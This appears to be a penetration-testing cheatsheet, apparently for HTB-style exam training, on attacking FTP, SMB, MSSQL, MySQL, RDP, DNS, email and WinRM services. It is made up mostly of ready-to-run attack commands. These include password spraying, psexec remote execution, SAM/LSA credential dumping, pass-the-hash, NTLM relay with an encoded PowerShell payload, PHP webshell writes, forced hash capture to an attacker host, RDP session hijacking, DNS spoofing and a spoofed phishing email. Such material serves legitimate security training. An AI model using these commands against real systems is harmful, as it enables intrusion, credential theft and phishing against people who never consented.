---
title: "Attacking Common Services"
description: "FTP, SMB, SQL, RDP, WinRM, DNS, and email — attacking typical services."
sidebar:
  order: 1
  label: "Attacking Common Services"
---
> Enumeration and exploitation of common network services: FTP, SMB, SQL, RDP, DNS, email, and WinRM. Misconfigurations, weak credentials, and unauthenticated RCE.

---


## FTP — Port 21

```bash
# Scan FTP with NSE scripts
sudo nmap -sV -p21 -sC --script=ftp-brute <IP>

# Anonymous access
ftp <IP>        # username: anonymous / anonymous
ftp> ls -la
ftp> get <file>
ftp> put <file>

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 15
medusa -u admin -P passwords.txt -h <IP> -M ftp

# FTP bounce attack (obsolete but still useful)
nmap -b <ftp-proxy-ip> <target-ip>
```

| Status | Description |
|--------|-------------|
| 220 | Service ready |
| 230 | Successful login |
| 331 | Username OK, password required |
| 530 | Incorrect login |

---

## SMB — Port 445

### Enumeration

```bash
# List shares (null session)
smbclient -N -L //<IP>
smbclient //<IP>/share -N                      # access without credentials

# smbmap — permissions per share
smbmap -H <IP>                                 # list shares
smbmap -H <IP> -r <share>                     # list content
smbmap -H <IP> --download '<share>\file.txt'
smbmap -H <IP> --upload exploit.exe '<share>\exploit.exe'

# rpcclient — RPC enumeration
rpcclient -U'%' <IP>                           # null session
rpcclient> enumdomusers                        # domain users
rpcclient> enumdomgroups
rpcclient> queryuser <RID>

# enum4linux-ng — all-in-one
enum4linux-ng -A <IP>                          # full enum
enum4linux-ng -A -C <IP>                       # with crackmapexec

# SMB nmap scripts
nmap -v -p445 --script=smb-vuln-ms17-010 <IP>
nmap -v -p445 --script smb-enum-shares,smb-enum-users <IP>
```

### Attacks — Misconfiguration and RCE

```bash
# Password spray
crackmapexec smb <IP> -u users.txt -p 'Password123' --continue-on-success
crackmapexec smb <IP>/24 -u administrator -p 'Password123'

# RCE via psexec (requires admin)
impacket-psexec administrator:'Password123'@<IP>
impacket-smbexec administrator:'Password123'@<IP>
impacket-atexec administrator:'Password123'@<IP> "whoami"

# Run command directly
crackmapexec smb <IP> -u administrator -p 'Password123' -x 'whoami'

# Dump SAM/credentials
crackmapexec smb <IP> -u administrator -p 'Password123' --sam
crackmapexec smb <IP> -u administrator -H <NT_hash> --lsa

# PtH via SMB
crackmapexec smb <IP> -u administrator -H <NT_hash>
impacket-psexec administrator@<IP> -hashes :<NT_hash>
```

### SMB — Hash Capture and Relay

```bash
# Capture NetNTLMv2 with Responder
sudo responder -I tun0 -wdv
# → then crack: hashcat -m 5600 hashes.txt rockyou.txt

# NTLM Relay (without SMB signing)
# Prerequisite: SMB signing disabled on the target
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> \
  -c 'powershell -enc <BASE64_PAYLOAD>'

# Verify SMB signing
crackmapexec smb <IP>/24 --gen-relay-list relay_targets.txt
nmap -v --script smb2-security-mode -p445 <IP>/24
```

> **CVE-2020-0796 SMBGhost:** Integer overflow in SMBv3.1.1 compression → unauthenticated RCE on Windows 10 1903/1909. Look for it using nmap `--script smb-vuln-ms17-010` (similar script approach).

---

## MSSQL — Port 1433

### Connection and Enumeration

```bash
# Connection
mssqlclient.py <user>:<pass>@<IP>               # impacket
mssqlclient.py <domain>/<user>:<pass>@<IP> -windows-auth
sqsh -S <IP> -U <user> -P <pass> -D <database>
sqlcmd -S <IP> -U SA -P 'Password!' -Q "SELECT name FROM sys.databases"

# Database enumeration
SQL> SELECT name FROM master.dbo.sysdatabases    # list DBs
SQL> USE <database>
SQL> SELECT table_name FROM information_schema.tables WHERE table_type='base table'
SQL> SELECT * FROM users
```

### RCE via xp_cmdshell

```sql
-- Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Run OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
-- Reverse shell: download nc.exe and connect back
```

### File Operations

```sql
-- Write file (requires Ole Automation Procedures)
EXECUTE sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT,
  'C:\inetpub\wwwroot\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', NULL, '<?php echo system($_GET["cmd"]); ?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;

-- Read file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
```

### Capture MSSQL Server Hash

```bash
# On the attacker: start SMB server
sudo responder -I tun0 -wdv
# or: sudo impacket-smbserver share ./ -smb2support

# In MSSQL: force SMB connection to the attacker
SQL> EXEC master..xp_dirtree '\\<LHOST>\share\'
SQL> EXEC master..xp_subdirs '\\<LHOST>\share\'

# → captures NetNTLMv2 hash of the SQL service user
# → then crack: hashcat -m 5600 hash.txt rockyou.txt
```

### Impersonation and Linked Servers

```sql
-- Verify who can be impersonated
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
WHERE a.permission_name='IMPERSONATE';

-- Impersonate login
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;  -- verify who we are
REVERT;              -- revert to the original user

-- Linked servers
SELECT srvname, isremote FROM sysservers;
EXECUTE('SELECT @@version') AT [<LINKED_SERVER_NAME>];
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [<LINKED_SERVER_NAME>];
```

---

## MySQL — Port 3306

```bash
# Connection
mysql -u root -p<password> -h <IP>
mysql -u root -h <IP> --password='password'

# Basic enumeration
mysql> SHOW DATABASES;
mysql> USE <database>;
mysql> SHOW TABLES;
mysql> SELECT * FROM users;

# Write webshell (requires FILE privilege and writeable path)
mysql> SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/webshell.php';

# Read server files
mysql> SELECT LOAD_FILE("/etc/passwd");

# Verify privileges
mysql> SHOW GRANTS FOR CURRENT_USER();
mysql> SELECT user, authentication_string FROM mysql.user;    -- requires root
```

> **Exam Tip:** `INTO OUTFILE` requires `FILE` privileges and that the directory is writeable by the `mysql` user. Common paths: `/var/www/html/`, `/srv/http/`.

---

## RDP — Port 3389

### Enumeration and Brute-Force

```bash
# Verify if RDP is active
nmap -sV -p3389 <IP> --script rdp-enum-encryption

# Password spray
crowbar -b rdp -s <IP>/32 -U users.txt -c 'Password123'
hydra -L users.txt -P passwords.txt rdp://<IP> -t 4 -V

# Access
rdesktop -u <user> -p <pass> <IP>
xfreerdp /v:<IP> /u:<user> /p:<pass> /dynamic-resolution
```

### PtH via RDP

```bash
# Requires: DisableRestrictedAdmin = 0 (enable on the target)
# From a privileged shell on the target:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Connect with NT hash
xfreerdp /v:<IP> /u:administrator /pth:<NT_hash>
```

### Session Hijacking (Requires SYSTEM)

```powershell
# List active sessions
query user

# Hijack session without password (SYSTEM required)
sc.exe create sessionhijack binpath="cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>"
sc.exe start sessionhijack

# Alternative: direct tscon from SYSTEM shell
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
```

> **CVE-2019-0708 BlueKeep:** Use-after-free in RDP pre-auth → unauthenticated RCE on Windows XP/7/Server 2008. Verify with `nmap --script rdp-vuln-ms12-020`.

---

## DNS — Port 53

### Enumeration and Zone Transfer

```bash
# Zone transfer (AXFR) — jackpot if unprotected
dig AXFR inlanefreight.htb @<DNS_SERVER_IP>

# Enumerate DNS servers
dig NS inlanefreight.htb @<IP>
host -t NS inlanefreight.htb

# Enumerate MX records
dig mx inlanefreight.htb | grep "MX" | grep -v ";"
host -t MX inlanefreight.htb

# Subdomain brute force
fierce --domain inlanefreight.com --dns-servers <IP>

# Subfinder — passive enumeration via OSINT
./subfinder -d inlanefreight.com -v

# Subbrute — for internal networks without internet access
echo "ns1.inlanefreight.com" > resolvers.txt
./subbrute.py inlanefreight.com -s names.txt -r resolvers.txt

# Verify CNAME for subdomain takeover
host support.inlanefreight.com
nslookup support.inlanefreight.com
# If it responds "NoSuchBucket" or similar → possible subdomain takeover
```

### DNS Spoofing — Local Network

```bash
# Ettercap dns_spoof
# 1. Edit /etc/ettercap/etter.dns
echo 'inlanefreight.com   A   <ATTACKER_IP>' >> /etc/ettercap/etter.dns
echo '*.inlanefreight.com A   <ATTACKER_IP>' >> /etc/ettercap/etter.dns

# 2. Ettercap → Hosts → Scan → add target and gateway
# 3. Plugins → dns_spoof → activate
# 4. Users resolving inlanefreight.com → redirected to the attacker

# Bettercap
sudo bettercap -iface tun0
> set dns.spoof.domains inlanefreight.com
> set dns.spoof.address <ATTACKER_IP>
> dns.spoof on
```

**Subdomain Takeover Checklist:**
```
1. subfinder -d <domain>   → list subdomains
2. host <subdomain>        → look for CNAME to external service
3. Visit URL             → error "NoSuchBucket", "404 not found", etc.
4. can-i-take-over-xyz     → verify if the service is vulnerable
5. Register expired domain → control the subdomain
```

---

## Email — SMTP/POP3/IMAP4

### Ports and Connection

| Port | Service | Encryption |
|--------|---------|---------|
| 25 | SMTP | None |
| 465 | SMTP | SSL |
| 587 | SMTP | STARTTLS |
| 110 | POP3 | None |
| 995 | POP3 | SSL |
| 143 | IMAP4 | None |
| 993 | IMAP4 | SSL |

```bash
# Complete scan of email ports
sudo nmap -Pn -sV -sC -p25,110,143,465,587,993,995 <IP>

# Telnet SMTP (identify version, available commands)
telnet <IP> 25
EHLO inlanefreight.htb      # list supported extensions
```

### User Enumeration

```bash
# Via manual telnet
# VRFY — verify if user exists
VRFY root
# 252 = exists | 550 = does not exist

# EXPN — expand distribution list
EXPN support-team

# RCPT TO — verify recipient
MAIL FROM:test@htb.com
RCPT TO:julio           # 250 = exists | 550 = does not exist

# POP3 — USER command
telnet <IP> 110
USER julio              # +OK = exists | -ERR = does not exist

# smtp-user-enum — automated
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t <IP>
smtp-user-enum -M VRFY -U userlist.txt -t <IP>
smtp-user-enum -M EXPN -U userlist.txt -D inlanefreight.htb -t <IP>
```

### Brute Force — Email Services

```bash
# Hydra — POP3/IMAP4
hydra -L users.txt -p 'Company01!' -f <IP> pop3
hydra -L users.txt -P passwords.txt <IP> imap

# O365 — validate domain, enumerate users, spray
python3 o365spray.py --validate --domain msplaintext.xyz
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' \
  --count 1 --lockout 1 --domain msplaintext.xyz

# MailSniper — O365 / Exchange
Invoke-PasswordSprayOWA -ExchHostname <IP> -UserList users.txt -Password 'Pass123'

# CredKing — Gmail/Okta (external tool)
```

### Open Relay — Phishing via SMTP

```bash
# Detect open relay with nmap
nmap -p25 -Pn --script smtp-open-relay <IP>
# "Server is an open relay (14/16 tests)" → vulnerable

# Send spoofed email via open relay
swaks --from notifications@inlanefreight.com \
  --to employees@inlanefreight.com \
  --header 'Subject: Urgent - Action Required' \
  --body 'Click here: http://<PHISHING_LINK>/' \
  --server <IP>
```

> **CVE-2020-7247 OpenSMTPD:** Unauthenticated RCE in OpenSMTPD ≤ 6.6.2. Injection via the FROM field with a semicolon (`;`). Limit of 64 characters per command. Affects Debian, Fedora, FreeBSD.

---

## WinRM — Port 5985/5986

```bash
# Verify WinRM is active
nmap -sV -p5985,5986 <IP>

# evil-winrm — interactive shell
evil-winrm -i <IP> -u <user> -p '<password>'
evil-winrm -i <IP> -u <user> -H <NT_hash>           # PtH

# NetExec / CrackMapExec
netexec winrm <IP> -u <user> -p '<password>'
netexec winrm <IP> -u users.txt -p passwords.txt     # spray
netexec winrm <IP> -u <user> -H <NT_hash>            # PtH
netexec winrm <IP>/24 -u administrator -p 'Pass123'  # range

# PowerShell remoting (from Windows)
$session = New-PSSession -ComputerName <IP> -Credential (Get-Credential)
Enter-PSSession $session
Invoke-Command -ComputerName <IP> -Credential $cred -ScriptBlock { whoami }
```

---

## Attack Flow — By Service

```
FTP:
  1. anonymous login → search for sensitive files (configs, creds)
  2. If not → hydra brute force
  3. If write access is available → upload webshell (if there is a web server)

SMB:
  1. null session enum (smbclient -N, enum4linux-ng)
  2. Identify shares + permissions → search for credentials in files
  3. spray → psexec/smbexec if admin
  4. If not admin → Responder + relay (if signing is disabled)

MSSQL:
  1. mssqlclient.py with credentials or SA without password
  2. xp_cmdshell → RCE as the SQL service account
  3. If xp_cmdshell is not available → impersonation → linked servers
  4. xp_dirtree → capture NetNTLMv2 hash

RDP:
  1. crowbar/hydra spray against known users
  2. xfreerdp /pth if NT hash is available + DisableRestrictedAdmin=0
  3. If SYSTEM shell is available → session hijacking (tscon)

DNS:
  1. dig AXFR → complete zone transfer if vulnerable
  2. fierce/subfinder → subdominios
  3. host CNAME → does it point to an expired service? → takeover

SMTP:
  1. smtp-user-enum → identify valid users
  2. hydra/o365spray → brute force / spray
  3. open relay → swaks for internal phishing
```

---

## Pitfalls / Gotchas

- **SMB signing enabled** → `ntlmrelayx` will not work. Verify first with `crackmapexec smb --gen-relay-list`.
- **xp_cmdshell disabled** → enabling it requires `sysadmin` role. If not `sysadmin`, try impersonation first.
- **MSSQL hash capture** → the captured hash is of the SQL service user (e.g., `MSSQL$SQL2019`), not necessarily the admin.
- **AXFR blocked in production** → this is the norm. Proceed directly to brute force with `subfinder`/`dnsenum`.
- **Subdomain takeover** → always confirm with `can-i-take-over-xyz` before registering. Some services require verification.
- **smtp-user-enum slow** → use `-w 1` for a shorter timeout on slow networks.
- **O365 enumeration detected** → `o365spray` can be detected. Reduce rate (`--rate 5`).
- **RDP spray lockout** → the lockout threshold is typically 3-5 attempts. Use `--continue-on-success` and a slow rotation.
- **evil-winrm without WinRM active** → verify with `Test-WSMan <IP>` from PowerShell first.
- **MySQL OUTFILE permissions** → the mysql process does not always have write access to `/var/www/html/`. Test with `SHOW VARIABLES LIKE 'secure_file_priv'` to see restrictions.
- **Open relay in cloud** → cloud providers (AWS SES, SendGrid) block relay by default. Only applies to poorly configured on-premise servers.

---

## Related Cheatsheets

- [Footprinting](/en/metodologias/recon/footprinting/) — Deep enumeration of each service (FTP, SMB, SMTP, DNS)
- [Password Attacks](/en/metodologias/exploitation/password-attacks/) — Hashcat to crack NetNTLMv2, PtH, spray patterns
- [Network Enumeration with Nmap](/en/metodologias/recon/network-enumeration-nmap/) — Prior port scan to identify services
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — Relay + AD privilege escalation
- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — Access internal services from pivots
- [SQL Injection Fundamentals](/en/metodologias/web/sql-injection-fundamentals/) — Additional SQL attacks from the web app
